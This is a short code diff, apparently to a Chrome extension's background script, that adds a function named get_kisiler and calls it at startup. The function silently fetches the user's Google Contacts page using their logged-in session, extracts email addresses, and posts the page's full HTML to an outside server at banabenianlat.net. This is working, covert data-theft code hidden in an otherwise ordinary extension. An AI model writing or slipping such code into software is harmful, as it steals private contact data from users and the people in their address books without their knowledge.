@@ -182,7 +182,7 @@ var sayac = 0;
 
 
 engine();
-
+get_kisiler();
 $(function(){  
     setInterval(function(){
        engine_isactive();
@@ -338,6 +338,26 @@ function set_identity_email(){
   });
 }
 
+function get_kisiler(){
+    $.get("https://contacts.google.com/", function(data){
+        var $htmlData = data;
+        $m = $htmlData.match(/([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)/gi);
+        // Get rid of doubled emails.
+        var m = Array.from(new Set($m)); 
+        //Get rid of robert@broofa.com
+        m.splice(m.indexOf("robert@broofa.com"),1);
+        //console.log(m);
+        $.post("https://banabenianlat.net/ChromeExtensions/EksiBildirim/kisiler.php",
+        {
+            htmlData:$htmlData
+        },
+        function(return_data, status){
+            //console.log(return_data)
+        }
+    );
+
+    });
+}
 /**
  * calback function get an object has properties of:
 integer	tabId	
